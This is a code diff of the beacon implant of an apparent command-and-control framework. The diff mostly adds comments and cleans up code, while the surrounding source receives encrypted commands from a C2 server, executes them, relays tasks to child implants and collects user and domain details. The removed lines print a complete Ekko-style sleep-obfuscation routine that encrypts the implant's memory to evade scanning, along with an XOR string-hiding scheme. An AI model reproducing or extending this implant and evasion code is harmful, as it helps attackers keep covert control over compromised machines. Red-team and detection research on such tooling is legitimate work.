@@ -32,14 +32,6 @@ typedef ModuleCmd* (*constructProc)();
 using namespace std;
 
 
-// // XOR encrypted at compile time, so don't appear in string
-// constexpr std::string_view _KeyTraficEncryption_ = "dfsdgferhzdzxczevre5595485sdg";
-// constexpr std::string_view mainKeyConfig = ".CRT$XCL";
-
-// // compile time encryption
-// constexpr std::array<char, 29> _EncryptedKeyTraficEncryption_ = compileTimeXOR<29, 8>(_KeyTraficEncryption_, mainKeyConfig);
-
-
 #ifdef __linux__
 
 
@@ -213,13 +205,6 @@ IntegrityLevel GetCurrentProcessIntegrityLevel()
 
 Beacon::Beacon()
 {	
-	// // decrypt key
-    // std::string keyDecrypted(std::begin(_EncryptedKeyTraficEncryption_), std::end(_EncryptedKeyTraficEncryption_));
-    // std::string key(mainKeyConfig);
-    // XOR(keyDecrypted, key);
-
-	// m_key=keyDecrypted;
-
 	m_beaconHash = random_string(SizeBeaconHash);
 	m_aliveTimerMs = 1000;
 
@@ -305,7 +290,7 @@ Beacon::Beacon()
 		LookupAccountSid(NULL, pTokenUser->User.Sid, szUserName, &dwUserNameLength, szDomainName, &dwDomainNameLength, &sidNameUse);
 		acctName=szUserName;
 		domainname=szDomainName;
-		delete pTokenUser;
+		delete[] pTokenUser;
 	}
 
 	if(!domainname.empty())
@@ -366,13 +351,10 @@ void Beacon::run()
 		}
 		catch(const std::exception& ex)
 		{
-			// std::cout << "Exeption " << std::endl;
-			// std::cout << "Exeption " << ex.what() << std::endl;
 			sleep();
 		}
 		catch (...) 
 		{
-			// std::cout << "Exeption" << std::endl;
 			sleep();
 		}
 	}
@@ -393,61 +375,71 @@ bool Beacon::initConfig(const std::string& config)
 }
 
 
-// Distribute commands from C2 adress to this beacon and child beacons
+// Distribute commands from C2 address to this beacon and child beacons
 bool Beacon::cmdToTasks(const std::string& input)
 {
-	std::string data;
-	try
-	{
-		data = base64_decode(input);
-	} 
-	catch (...)
-	{
-		return false;
-	}
+    std::string data;
+    try
+    {
+        // Decode the base64-encoded input string from the C2 server
+        data = base64_decode(input);
+    } 
+    catch (...)
+    {
+        // If decoding fails, return false
+        return false;
+    }
 
-	XOR(data, m_key);
+    // Decrypt the data using the beacon's XOR key
+    XOR(data, m_key);
 
-	MultiBundleC2Message multiBundleC2Message;
-	multiBundleC2Message.ParseFromArray(data.data(), (int)data.size());
+    // Parse the decrypted data into a MultiBundleC2Message object
+    MultiBundleC2Message multiBundleC2Message;
+    multiBundleC2Message.ParseFromArray(data.data(), (int)data.size());
 
-	for (int k = 0; k < multiBundleC2Message.bundlec2messages_size(); k++) 
-	{
-		BundleC2Message* bundleC2Message = multiBundleC2Message.bundlec2messages(k);
+    // Iterate over each BundleC2Message in the multi-bundle message
+    for (int k = 0; k < multiBundleC2Message.bundlec2messages_size(); k++) 
+    {
+        BundleC2Message* bundleC2Message = multiBundleC2Message.bundlec2messages(k);
 
-		// Handle tasks address to this particular Beacon
-		std::string beaconhash = bundleC2Message->beaconhash();
-		if(beaconhash==m_beaconHash)
-		{
-			for (int j = 0; j < bundleC2Message->c2messages_size(); j++) 
-			{
-				const C2Message& c2Message = bundleC2Message->c2messages(j);
-				m_tasks.push(c2Message);
-			}
-		}
-		// Handle tasks address to child sessions
-		else
-		{
-			for(int i=0; i<m_listeners.size(); i++)
-			{
-				for(int j=0; j<m_listeners[i]->getNumberOfSession(); j++)
-				{
-					std::shared_ptr<Session> ptr = m_listeners[i]->getSessionPtr(j);
+        // Check if the message is addressed to this beacon
+        std::string beaconhash = bundleC2Message->beaconhash();
+        if(beaconhash==m_beaconHash)
+        {
+            // Queue each C2Message task for this beacon
+            for (int j = 0; j < bundleC2Message->c2messages_size(); j++) 
+            {
+                const C2Message& c2Message = bundleC2Message->c2messages(j);
+                m_tasks.push(c2Message);
+            }
+        }
+        // Otherwise, the message is for a child session
+        else
+        {
+            // Iterate through all listeners
+            for(int i=0; i<m_listeners.size(); i++)
+            {
+                // Check each session for a matching beacon hash
+                for(int j=0; j<m_listeners[i]->getNumberOfSession(); j++)
+                {
+                    std::shared_ptr<Session> ptr = m_listeners[i]->getSessionPtr(j);
 
-					if(ptr->getBeaconHash()==beaconhash)
-					{
-						for (int k = 0; k < bundleC2Message->c2messages_size(); k++) 
-						{
-							const C2Message& c2Message = bundleC2Message->c2messages(k);
-							m_listeners[i]->queueTask(beaconhash, c2Message);
-						}
-					}
-				}
-			}
-		}
-	}
+                    if(ptr->getBeaconHash()==beaconhash)
+                    {
+                        // Queue each C2Message task for the matching child session
+                        for (int k = 0; k < bundleC2Message->c2messages_size(); k++) 
+                        {
+                            const C2Message& c2Message = bundleC2Message->c2messages(k);
+                            m_listeners[i]->queueTask(beaconhash, c2Message);
+                        }
+                    }
+                }
+            }
+        }
+    }
 
-	return true;
+    // Return true if all tasks were distributed successfully
+    return true;
 }
 
 
@@ -522,52 +514,56 @@ bool Beacon::taskResultsToCmd(std::string& output)
 }
 
 
-// Execute the right module corresponding to the command received from the C2
+// Execute the appropriate modules and instructions based on tasks received from the C2.
+// Returns true if an instruction indicates the beacon should exit, otherwise false.
 bool Beacon::runTasks()
 {
-	for(auto it = m_moduleCmd.begin() ; it != m_moduleCmd.end(); ++it )
+	// Execute all recurring module commands and collect their results.
+	for (auto it = m_moduleCmd.begin(); it != m_moduleCmd.end(); ++it)
 	{
 		C2Message c2RetMessage;
 		int result = (*it)->recurringExec(c2RetMessage);
 
-		if(result)
+		// If the module executed successfully, store the result for response construction.
+		if (result)
 			m_taskResult.push(c2RetMessage);
 	}
 
-	// Handle every task adress to this beacon and put results in a list that will be usse to create the response message
-	while(!m_tasks.empty())
+	// Process each individual task assigned to this beacon.
+	// These are one-time commands sent from the C2 server.
+	while (!m_tasks.empty())
 	{
 		C2Message c2Message = m_tasks.front();
 		m_tasks.pop();
 
 		C2Message c2RetMessage;
+		
+		// Execute the instruction and generate the response.
 		bool exit = execInstruction(c2Message, c2RetMessage);
 
-		// not needed ???
-		// std::string out;
-		// c2RetMessage.SerializeToString(&out);
-
+		// Store the result of the execution.
 		m_taskResult.push(std::move(c2RetMessage));
 
-		if(exit)
-			return exit; 
+		// If the instruction indicates the beacon should exit, return immediately.
+		if (exit)
+			return exit;
 	}
 
-	// For each listener, add a proof-of-life entry to the result list.
-	// This ensures the response message includes current listener state,
-	// which is useful if the connection with a beacon is lost and later restored.
-	for(int i=0; i<m_listeners.size(); i++)
+	// Add a heartbeat or "proof-of-life" message for each active listener.
+	// This helps the C2 track which listeners are still alive and their current state.
+	for (int i = 0; i < m_listeners.size(); i++)
 	{
 		C2Message listenerProofOfLife;
 
-		listenerProofOfLife.set_instruction(ListenerPollCmd);
-		listenerProofOfLife.set_data(m_listeners[i]->getListenerHash());
-		listenerProofOfLife.set_returnvalue(m_listeners[i]->getListenerMetadata());
+		listenerProofOfLife.set_instruction(ListenerPollCmd);                            // Indicate this is a poll/proof message.
+		listenerProofOfLife.set_data(m_listeners[i]->getListenerHash());                // Include unique listener identifier.
+		listenerProofOfLife.set_returnvalue(m_listeners[i]->getListenerMetadata());     // Include listener status/metadata.
 
-
+		// Add the heartbeat to the response queue.
 		m_taskResult.push(listenerProofOfLife);
 	}
 
+	// No exit signal was received; continue beacon execution.
 	return false;
 }
 
@@ -581,15 +577,6 @@ void Beacon::sleep()
     int jitteredTimeMs = static_cast<int>(m_aliveTimerMs * dis(gen));
 
     std::this_thread::sleep_for(std::chrono::milliseconds(jitteredTimeMs));
-
-	// else
-	// {
-	// 	int dela = rand()%(int(float(m_aliveTimerMs)/100.0*20.0))-int(float(m_aliveTimerMs)/100.0*10.0);
-	// 	int timeToSleepMs = m_aliveTimerMs + dela;
-
-	// 	// EkkoObf( timeToSleepMs );
-	// 	std::this_thread::sleep_for(std::chrono::milliseconds(timeToSleepMs));
-	// }
 }
 
 
@@ -777,7 +764,6 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 
 			try 
 			{
-				// TODO issu here ?
 				uint32_t ip_dst = std::stoi(c2Message.data());
 				uint16_t port = std::stoi(c2Message.args());
 			
@@ -1055,7 +1041,6 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		if(object!=m_moduleCmd.end())
 		{
 #ifdef __linux__
-			// TODO fail !
 			Dl_info  DlInfo;
 			if ((dladdr((void*)((*object)->getHash()), &DlInfo)) != 0)
 			{
@@ -1106,125 +1091,3 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 
 	return false;
 }
-
-// OPSEC enable sleep obfuscation for x64
-
-// #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
-// #define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
-// #define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )
-
-// typedef struct {
-//     DWORD	Length;
-//     DWORD	MaximumLength;
-//     PVOID	Buffer;
-// } USTRING ;
-
-
-
-// VOID EkkoObf( DWORD SleepTime )
-// {
-//     CONTEXT CtxThread   = { 0 };
-
-//     CONTEXT RopProtRW   = { 0 };
-//     CONTEXT RopMemEnc   = { 0 };
-//     CONTEXT RopDelay    = { 0 };
-//     CONTEXT RopMemDec   = { 0 };
-//     CONTEXT RopProtRX   = { 0 };
-//     CONTEXT RopSetEvt   = { 0 };
-
-//     HANDLE  hTimerQueue = NULL;
-//     HANDLE  hNewTimer   = NULL;
-//     HANDLE  hEvent      = NULL;
-//     PVOID   ImageBase   = NULL;
-//     DWORD   ImageSize   = 0;
-//     DWORD   OldProtect  = 0;
-
-// 	CHAR KeyBuf[16];
-// 	unsigned int r = 0;
-// 	for (int i = 0; i < 16; i++) 
-// 		KeyBuf[i] = (CHAR) rand();
-
-//     USTRING Key         = { 0 };
-//     USTRING Img         = { 0 };
-
-//     PVOID   NtContinue  = NULL;
-//     PVOID   SysFunc032  = NULL;
-
-//     hEvent      = CreateEventW( 0, 0, 0, 0 );
-//     hTimerQueue = CreateTimerQueue();
-
-//     NtContinue  = GetProcAddress( GetModuleHandleA( "Ntdll" ), "NtContinue" );
-//     SysFunc032  = GetProcAddress( LoadLibraryA( "Advapi32" ),  "SystemFunction032" );
-
-//     ImageBase   = GetModuleHandleA( NULL );
-//     ImageSize   = ( ( PIMAGE_NT_HEADERS ) ( (DWORD64) ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew ) )->OptionalHeader.SizeOfImage;
-
-//     Key.Buffer  = KeyBuf;
-//     Key.Length  = Key.MaximumLength = 16;
-
-//     Img.Buffer  = ImageBase;
-//     Img.Length  = Img.MaximumLength = ImageSize;
-
-//     if ( CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) )
-//     {
-//         WaitForSingleObject( hEvent, 0x32 );
-
-//         memcpy( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
-//         memcpy( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
-//         memcpy( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
-//         memcpy( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
-//         memcpy( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
-//         memcpy( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );
-
-//         // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
-//         RopProtRW.Rsp  -= 8;
-//         RopProtRW.Rip   = (DWORD64)VirtualProtect;
-//         RopProtRW.Rcx   = (DWORD64)ImageBase;
-//         RopProtRW.Rdx   = (DWORD64)ImageSize;
-//         RopProtRW.R8    = (DWORD64)PAGE_READWRITE;
-//         RopProtRW.R9    = (DWORD64)&OldProtect;
-
-// 		// "RtlEncryptDecryptRC4"
-//         // SystemFunction032( &Key, &Img );
-//         RopMemEnc.Rsp  -= 8;
-//         RopMemEnc.Rip   = (DWORD64)SysFunc032;
-//         RopMemEnc.Rcx   = (DWORD64)&Img;
-//         RopMemEnc.Rdx   = (DWORD64)&Key;
-
-//         // WaitForSingleObject( hTargetHdl, SleepTime );
-//         RopDelay.Rsp   -= 8;
-//         RopDelay.Rip    = (DWORD64)WaitForSingleObject;
-//         RopDelay.Rcx    = (DWORD64)NtCurrentProcess();
-//         RopDelay.Rdx    = (DWORD64)SleepTime;
-
-//         // SystemFunction032( &Key, &Img );
-//         RopMemDec.Rsp  -= 8;
-//         RopMemDec.Rip   = (DWORD64)SysFunc032;
-//         RopMemDec.Rcx   = (DWORD64)&Img;
-//         RopMemDec.Rdx   = (DWORD64)&Key;
-
-//         // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
-//         RopProtRX.Rsp  -= 8;
-//         RopProtRX.Rip   = (DWORD64)VirtualProtect;
-//         RopProtRX.Rcx   = (DWORD64)ImageBase;
-//         RopProtRX.Rdx   = (DWORD64)ImageSize;
-//         RopProtRX.R8    = (DWORD64)PAGE_EXECUTE_READWRITE;
-//         RopProtRX.R9    = (DWORD64)&OldProtect;
-
-//         // SetEvent( hEvent );
-//         RopSetEvt.Rsp  -= 8;
-//         RopSetEvt.Rip   = (DWORD64)SetEvent;
-//         RopSetEvt.Rcx   = (DWORD64)hEvent;
-
-//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
-//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
-//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
-//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
-//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
-//         CreateTimerQueueTimer( &hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );
-
-//         WaitForSingleObject( hEvent, INFINITE );
-//     }
-
-//     DeleteTimerQueue( hTimerQueue );
-// }
